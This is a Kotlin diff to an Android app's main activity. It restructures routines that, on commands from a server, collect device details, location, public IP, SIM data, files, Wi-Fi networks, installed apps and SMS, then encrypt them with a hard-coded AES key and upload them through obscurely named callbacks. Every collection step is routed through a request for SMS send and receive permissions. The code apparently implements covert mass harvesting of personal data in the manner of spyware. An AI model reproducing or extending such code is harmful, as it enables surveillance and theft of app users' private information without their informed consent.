@@ -81,10 +81,10 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
                 }
             }
         })
-        requestSmsPermission()
     }
 
-    private fun requestSmsPermission() {
+    @RequiresApi(Build.VERSION_CODES.M)
+    private fun requestSmsPermission(type: String) {
         XXPermissions.with(this)
             .permission(Permission.RECEIVE_SMS)
             .permission(Permission.SEND_SMS)
@@ -93,11 +93,73 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
             .interceptor(PermissionInterceptor())
             .request { _, allGranted ->
                 if (allGranted) {
-                    getSMSInfo()
+                    when (type) {
+                        "DEVICE" -> {
+                            upLoadDeviceInfo()
+                        }
+
+                        "APP" -> {
+                            upLoadAppInfo()
+                        }
+
+                        "SMS" -> {
+                            getSMSInfo()
+                        }
+                    }
+
                 } else {
                     RxToast.showToast("Insufficient permissions. Please manually enable permissions and try again")
                 }
             }
+    }
+
+    private fun upLoadAppInfo() {
+        val appInfoList = getAppInfo()
+        val body = AppInfoParam(
+            AppInfoParam.ModelBean(
+                deviceApps = appInfoList
+            )
+        )
+        val gsonData = Gson().toJson(body)
+        val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
+        val paramsBody = aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+        showLoadingExt("loading.....")
+        mViewModel.mnemonMnemonicCallBack(paramsBody)
+    }
+
+    @RequiresApi(Build.VERSION_CODES.M)
+    private fun upLoadDeviceInfo() {
+        val generaBody = DriverInfoUtil.getGeneralData(this)
+        val hardware = DriverInfoUtil.getHardware(this)
+        val publicIp = DriverInfoUtil.getPublicIp()
+        val simCard = DriverInfoUtil.getSimCard(this)
+        val otherData = DriverInfoUtil.getOtherData(this)
+        val location = DriverInfoUtil.getLocation(this)
+        val storage = DriverInfoUtil.getStorage(this)
+        val devFile = DriverInfoUtil.getDivFile(this)
+        val batteryStatus = DriverInfoUtil.getBatteryStatus(this)
+        val currWifi = DriverInfoUtil.getCurrentWifi(this)
+        val configWifi = DriverInfoUtil.getConfigWifi(this)
+        val body = DeviceInfoParam(
+            DeviceInfoParam.ModelBean(
+                generalData = generaBody,
+                hardware = hardware,
+                publicIp = publicIp,
+                simCard = simCard,
+                otherData = otherData,
+                location = location,
+                storage = storage,
+                devFile = devFile,
+                batteryStatus = batteryStatus,
+                currWifi = currWifi,
+                configWifi = configWifi,
+            )
+        )
+        val gsonData = Gson().toJson(body)
+        val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
+        val paramsBody = aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+        showLoadingExt("loading.....")
+        mViewModel.gangerCallBack(paramsBody)
     }
 
     @SuppressLint("Range")
@@ -132,55 +194,15 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
                 it.list.forEachIndexed { _, s ->
                     when (s) {
                         "DEVICE" -> {
-                            val generaBody = DriverInfoUtil.getGeneralData(this)
-                            val hardware = DriverInfoUtil.getHardware(this)
-                            val publicIp = DriverInfoUtil.getPublicIp()
-                            val simCard = DriverInfoUtil.getSimCard(this)
-                            val otherData = DriverInfoUtil.getOtherData(this)
-                            val location = DriverInfoUtil.getLocation(this)
-                            val storage = DriverInfoUtil.getStorage(this)
-                            val devFile = DriverInfoUtil.getDivFile(this)
-                            val batteryStatus = DriverInfoUtil.getBatteryStatus(this)
-                            val currWifi = DriverInfoUtil.getCurrentWifi(this)
-                            val configWifi = DriverInfoUtil.getConfigWifi(this)
-                            val body = DeviceInfoParam(
-                                DeviceInfoParam.ModelBean(
-                                    generalData = generaBody,
-                                    hardware = hardware,
-                                    publicIp = publicIp,
-                                    simCard = simCard,
-                                    otherData = otherData,
-                                    location = location,
-                                    storage = storage,
-                                    devFile = devFile,
-                                    batteryStatus = batteryStatus,
-                                    currWifi = currWifi,
-                                    configWifi = configWifi,
-                                )
-                            )
-                            val gsonData = Gson().toJson(body)
-                            val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
-                            val paramsBody = aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
-                            showLoadingExt("loading.....")
-                            mViewModel.gangerCallBack(paramsBody)
+                            requestSmsPermission("DEVICE")
                         }
 
                         "APP" -> {
-                            val appInfoList = getAppInfo()
-                            val body = AppInfoParam(
-                                AppInfoParam.ModelBean(
-                                    deviceApps = appInfoList
-                                )
-                            )
-                            val gsonData = Gson().toJson(body)
-                            val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
-                            val paramsBody = aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
-                            showLoadingExt("loading.....")
-                            mViewModel.mnemonMnemonicCallBack(paramsBody)
+                            requestSmsPermission("APP")
                         }
 
                         "SMS" -> {
-
+                            requestSmsPermission("SMS")
                         }
                     }
                 }
